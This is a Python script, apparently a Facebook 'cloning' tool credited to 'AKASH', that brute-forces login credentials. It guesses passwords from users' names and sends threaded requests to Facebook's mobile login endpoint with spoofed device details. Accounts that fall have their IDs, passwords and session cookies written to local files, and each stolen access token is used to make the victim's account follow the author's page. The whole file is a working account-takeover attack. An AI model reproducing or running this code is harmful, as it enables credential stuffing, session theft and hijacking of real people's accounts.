import os
import time
import random
import sys
import json
import uuid
import os,requests,json,time,re,random,sys,uuid,string,subprocess


try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO

green = '\033[32m'
blue = '\033[94m'
reset = '\033[0m'
red = '\033[1;31m'
greenn = '\x1b[1;32m'
mw = "Dalvik/2.1.0 (Linux; U; 10; SM-T531 Build/LRX22G) [FBAN/FB5A;FBAV/138.26.39.68;FBBV/37353745;FBDM/{density=1.4,width=912,height=1524};FBLC/en_GB;FBRV/64978123;FBCR/AIRTEL;FBMF/SM-T531;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-T531;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;FBNT/3G;FBCN/Sprint;FBSR/218.218.48.117;]"

class System:
    def __init__(self , models):
        from concurrent.futures import ThreadPoolExecutor as rafa
        self.models = models
        self.idz = []
        self.oku = []
        self.cpu = []
        self.passwords = []
        self.rafa = rafa
        self.loop = 0
    
        
    def menu(self):
        try:
            os.makedirs('/sdcard/AKASH')
        except:
            pass
        os.system('clear')
        print(self.logo)
        print(f'[{green}1{reset}] FILE CLONING M1')
        print(f'[{green}2{reset}] FILE CLONING M2')
        print(47 * '-')
        select = input(f'\033[1;31m[\033[1;32mX\033[1;31m]\033[1;32m SELECT: ')
        if select == '1':
            self.file_clone()
        if select == '2':
        	self.file_clone2()
        else:
            os.system('xdg-open https://chat.whatsapp.com/')
            exit()
    def file_clone2(self):
        os.system('clear')
        print(self.logo)
        try:
            file = input(f' [{green}<>{reset}] FILE: ')
            for x in open(file, 'r').readlines():
                self.idz.append(x.strip())
        except Exception as e:
            print(e)
            time.sleep(2)
            self.menu()
        self.select_password2()
        
    def select_password2(self):
        os.system('clear')
        print(logo)
        how = input(f' [{green}<\>{reset}] PASSWORD LIMET: ')
        for x in range(int(how)):
            self.passwords.append(input(f' [{green}<\>{reset}] PASSWORD {1 + x}: '))
        self.cloning_process2()
        
    def cloning_process2(self):
        os.system('clear')
        print(logo)
        
        with self.rafa (max_workers=30) as send:
            for uids in self.idz:
                uids = uids.strip().lower()
                uid,name = uids.rsplit('|')
                first = name.rsplit(' ')[0]
                try:
                    last = name.rsplit(' ')[1]
                except Exception as e:
                    last = first
                send.submit(self.cloning2, uid,first,last)
        print(f'\n[{green}<\>{reset}] Brute Has Completed :) ')
        exit()        
    def file_clone(self):
        os.system('clear')
        print(self.logo)
        try:
            file = input(f' [{green}<\>{reset}] FILE: ')
            for x in open(file, 'r').readlines():
                self.idz.append(x.strip())
        except Exception as e:
            print(e)
            time.sleep(2)
            self.menu()
        self.select_password()
        
    def select_password(self):
        os.system('clear')
        print(logo)
        how = input(f' [{green}<\>{reset}] PASSWORD LIMET: ')
        for x in range(int(how)):
            self.passwords.append(input(f' [{green}<\>{reset}] PASSWORD {1 + x}: '))
        self.cloning_process()
        
    def cloning_process(self):
        os.system('clear')
        print(logo)
        
        with self.rafa (max_workers=30) as send:
            for uids in self.idz:
                uids = uids.strip().lower()
                uid,name = uids.rsplit('|')
                first = name.rsplit(' ')[0]
                try:
                    last = name.rsplit(' ')[1]
                except Exception as e:
                    last = first
                send.submit(self.cloning, uid,first,last)
        print(f'\n[{green}<\>{reset}] Brute Has Completed :) ')
        exit()
     #
    def cloning(self,uid,first,last):
        sys.stdout.write(f"[{green}<M1>{reset}] {str(self.loop)}/{str(len(self.idz))} ({green}OK{reset})={str(len(self.oku))} ({red}CP{reset})={str(len(self.cpu))}\r")
        model_,build = random.choice(self.models).rsplit('|')
        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
        fbbv = str(random.randint(10000000, 99999999))
        fbrv = str(random.randint(10000000, 99999999))
        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
        density = random.uniform(1.0, 4.0)
        width = random.randint(720, 1440)
        height = random.randint(1280, 2560)
        network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
        network_carrier = random.choice(network_carriers)
        network_type = random.choice(["WiFi", "4G", "3G"])
        ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
        fban = random.choice(["FB4A", "FB5A", "FB6A"])
        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
        fbbd = 'Samsung' 
        user_agentw = "[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
        user_agent = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density:.1f},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
        for pw in self.passwords:
            try:
                pw = pw.replace("first", first).replace("last", last).replace("First", first.capitalize()).replace("Last", last.capitalize())
                bandwidth = str(random.randint(1000000, 30000000))
                sim_hni = str(random.randint(10000, 99999))
                net_hni = str(random.randint(10000, 99999))
                quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                headers = [
                    'Authorization: OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    f'x-fb-connection-bandwidth: {bandwidth}',
                    f'x-fb-sim-hni: {sim_hni}',
                    f'x-fb-net-hni: {sim_hni}',
                    f'X-FB-Connection-Quality: {quality}',
                    f'X-FB-Connection-Type: Wifi',
                    f'user-agent: {mw.encode("utf-8")}',
                    'content-encoding: gzip,deflate',
                    'content-type: application/x-www-form-urlencoded',
                    'x-fb-http-engine: Liger',
                    'connection: keep-alive']
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                advertising_id = str(uuid.uuid4())
                data = {
                    'adid': f'{adid}',
                    'email': uid,
                    'password': pw,
                    'cpl': 'true',
                    'credentials_type': 'password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'register_api',
                    'format': 'json',
                    'device_id': f'{device_id}',
                    'family_device_id': f'{family_device_id}',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    'tier': 'regular',
                    'device': f'{fbbd}',
                    'android_version': f'{android_version}',
                    'carrier': f'{network_carrier}',
                    'app_id': '350685531728,',
                    'app_version': f'{facebook_version}',
                    'locale': 'en_GB',
                    'advertising_id': '{advertising_id}',
                    'fb_api_req_friendly_name': 'authenticate'}
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
                c.setopt(c.HTTPHEADER, headers)
                c.setopt(c.WRITEDATA, buffer)
                data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
                c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
                c.perform()
                c.close()
                body = buffer.getvalue().decode('utf-8')
                response = body
                if "session_key" in response:
                    try:
                        response_data = json.loads(body)
                        
                        uid = str(response_data['uid'])
                        follow(self,response_data)
                    except:
                        uid = uid
                    try:
                        response_data = json.loads(body)  
                        cookies = response_data.get("session_cookies")
                        coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                    except:
                        coki = 'no'
                    uid_pw = f"{uid}|{pw}|{coki}\n"
                    print(f'\r{greenn} [AKASH-OK] {uid} | {pw} {reset} ')
                    print (f' {coki}')
                    open('/sdcard/AKASH/akash-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/AKASH/akash-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{red} [AKASH-CP] {uid} | {pw} {reset}')
                    
                    open('/sdcard/AKASH/akash-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
            except pycurl.error as e:
                time.sleep(10)
                continue
            except Exception as e:
                print(e)
        self.loop +=1
#
    def cloning2(self,uid,first,last):
        sys.stdout.write(f"[{green}<M2>{reset}] {str(self.loop)}/{str(len(self.idz))} {green}Ok{reset}={str(len(self.oku))} ({red}CP{reset})={str(len(self.cpu))}\r")
        model_,build = random.choice(self.models).rsplit('|')
        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
        fbbv = str(random.randint(10000000, 99999999))
        fbrv = str(random.randint(10000000, 99999999))
        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
        density = random.uniform(1.0, 4.0)
        width = random.randint(720, 1440)
        height = random.randint(1280, 2560)
        network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
        network_carrier = random.choice(network_carriers)
        network_type = random.choice(["WiFi", "4G", "3G"])
        ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
        fban = random.choice(["FB4A", "FB5A", "FB6A"])
        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
        fbbd = 'Samsung' 
        user_agentw = "[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
        user_agent = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density:.1f},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
        for pw in self.passwords:
            try:
                pw = pw.replace("first", first).replace("last", last).replace("First", first.capitalize()).replace("Last", last.capitalize())
                bandwidth = str(random.randint(1000000, 30000000))
                sim_hni = str(random.randint(10000, 99999))
                net_hni = str(random.randint(10000, 99999))
                quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                headers = [
                    'Authorization: OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    f'x-fb-connection-bandwidth: {bandwidth}',
                    f'x-fb-sim-hni: {sim_hni}',
                    f'x-fb-net-hni: {sim_hni}',
                    f'X-FB-Connection-Quality: {quality}',
                    f'X-FB-Connection-Type: Wifi',
                    f'user-agent: {mw.encode("utf-8")}',
                    'content-encoding: gzip,deflate',
                    'content-type: application/x-www-form-urlencoded',
                    'x-fb-http-engine: Liger',
                    'connection: keep-alive']
                adid = str(uuid.uuid4())
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                advertising_id = str(uuid.uuid4())
                data = {
                    'adid': f'{adid}',
                    'email': uid,
                    'password': pw,
                    'cpl': 'true',
                    'credentials_type': 'password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'register_api',
                    'format': 'json',
                    'device_id': f'{device_id}',
                    'family_device_id': f'{family_device_id}',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    'tier': 'regular',
                    'device': f'{fbbd}',
                    'android_version': f'{android_version}',
                    'carrier': f'{network_carrier}',
                    'app_id': '350685531728,',
                    'app_version': f'{facebook_version}',
                    'locale': 'en_GB',
                    'advertising_id': '{advertising_id}',
                    'fb_api_req_friendly_name': 'authenticate'}
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, 'https://b-graph.facebook.com/auth/login')
                c.setopt(c.HTTPHEADER, headers)
                c.setopt(c.WRITEDATA, buffer)
                data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
                c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
                c.perform()
                c.close()
                body = buffer.getvalue().decode('utf-8')
                response = body
                if "session_key" in response:
                    try:
                        response_data = json.loads(body)
                        
                        uid = str(response_data['uid'])
                        follow(self,response_data)
                    except:
                        uid = uid
                    try:
                        response_data = json.loads(body)  
                        cookies = response_data.get("session_cookies")
                        coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                    except:
                        coki = 'no'
                    uid_pw = f"{uid}|{pw}|{coki}\n"
                    print(f'\r{greenn} [RAFAT-OK] {uid} | {pw} {reset} ')
                    print (f' {coki}')
                    open('/sdcard/AKASH/akash-ok-with-cookies.txt','a').write(str(uid_pw))
                    open('/sdcard/AKASH/akash-ok.txt','a').write(f'{uid}|{pw}\n')
                    self.oku.append(uid)
                    break
                elif "User must verify their account" in response:
                    print(f'\r{red} [AKASH-CP] {uid} | {pw} {reset}')
                   # print(f'\r {user_agent}')
                    open('/sdcard/AKASH/akash-cp.txt','a').write(f'{uid}|{pw}\n')
                    self.cpu.append(uid)
                    break
                else:
                    continue
            except pycurl.error as e:
                time.sleep(10)
                continue
            except Exception as e:
                print(e)
        self.loop +=1    
    def follow(self, response_data):
        try:
            tok = str(response_data['access_token'])
            url = 'https://graph.facebook.com/Akash123r/subscribers?access_token=' + tok
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, url)
            c.setopt(c.WRITEDATA, buffer)
            c.perform()
            c.close()
            response_body = buffer.getvalue()
        except:
            pass
        
if __name__ == "__main__":
    models =[
        "SM-G920F|NRD90M",
        "SM-T535|LRX22G",
        "SM-T231|KOT49H",
        "SM-J320F|LMY47V",
        "GT-I9190|KOT49H",
        "GT-N7100|KOT49H",
        "SM-T561|KTU84P",
        "GT-N7100|KOT49H",
        "GT-I9500|LRX22C",
        "SM-J320F|LMY47V",
        "SM-G930F|NRD90M",
        "SM-J320F|LMY47V",
        "SM-J510FN|NMF26X",
        "GT-P5100|IML74K",
        "SM-J320F|LMY47V",
        "SM-T531|LRX22G",
        "SPH-L720|KOT49H",
        "GT-I9500|JDQ39"
        ]
    os.system('clear')
    
    os.system('xdg-open https://www.facebook.com/Akash123r')
    #time.sleep(5)
    logo = f'''

      __       __   ___       __        ________  __    __   
     /""\     |/"| /  ")     /""\      /"       )/" |  | "\  
    /    \    (: |/   /     /    \    (:   \___/(:  (__)  :) 
   /' /\  \   |    __/     /' /\  \    \___  \   \/      \/  
  //  __'  \  (// _  \    //  __'  \    __/  \\  //  __  \\  
 /   /  \\  \ |: | \  \  /   /  \\  \  /" \   :)(:  (  )  :) 
(___/    \___)(__|  \__)(___/    \___)(_______/  \__|  |__/  
                                                             
\033[1;31m[\033[1;32mX\033[1;31m]\033[1;32m Author : AKASH
\033[1;31m[\033[1;32mX\033[1;31m]\033[1;32m Github : AKASH
\033[1;31m[\033[1;32mX\033[1;31m]\033[1;32m Update : 0.1\033[1;37m
{47 * '-'}'''
    system = System(models)
    system.logo = logo
    system.menu()
	